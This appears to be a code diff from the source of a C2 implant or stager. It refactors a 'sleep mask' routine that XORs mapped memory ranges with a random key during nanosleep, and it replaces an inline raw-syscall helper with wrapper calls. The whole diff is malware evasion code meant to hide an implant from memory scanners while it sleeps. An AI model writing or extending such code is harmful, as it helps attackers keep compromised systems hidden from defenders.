@@ -46,16 +46,6 @@ struct mask_scratch {
   struct c2_map ranges[MASK_MAX_RANGES];
 };
 
-static long mask_syscall(long n, long a1, long a2, long a3) {
-  unsigned long ret;
-  register long r10 __asm__("r10") = a3;
-  __asm__ __volatile__("syscall"
-                       : "=a"(ret)
-                       : "a"(n), "D"(a1), "S"(a2), "r"(r10)
-                       : "rcx", "r11", "memory");
-  return (long)ret;
-}
-
 static int read_full(int fd, void *buf, size_t len) {
   size_t off = 0;
   while (off < len) {
@@ -378,8 +368,8 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
   (void)probe;
   uintptr_t fs_base = 0;
   uintptr_t gs_base = 0;
-  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_FS, (long)&fs_base, 0);
-  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_GS, (long)&gs_base, 0);
+  (void)syscall2(SYS_arch_prctl, ARCH_GET_FS, (long)&fs_base);
+  (void)syscall2(SYS_arch_prctl, ARCH_GET_GS, (long)&gs_base);
   uintptr_t code_probe = (uintptr_t)(void *)&stager_mask_provider_sleep;
   struct mask_scratch *sc =
       (struct mask_scratch *)mmap(NULL, sizeof(*sc), PROT_READ | PROT_WRITE,
@@ -404,7 +394,7 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
     }
 
   uint8_t key[MASK_KEY_LEN];
-  if (mask_syscall(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) != MASK_KEY_LEN) {
+  if (syscall3(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) != MASK_KEY_LEN) {
     for (size_t i = 0; i < sizeof(key); i++)
       key[i] = (uint8_t)(i * 131u + (unsigned)seconds);
   }
@@ -419,7 +409,7 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
   ts.tv_nsec = 0;
   long rc;
   do {
-    rc = mask_syscall(SYS_nanosleep, (long)&ts, (long)&ts, 0);
+    rc = syscall2(SYS_nanosleep, (long)&ts, (long)&ts);
   } while (rc == -4);
 
   xor_ranges(ranges, n, key);
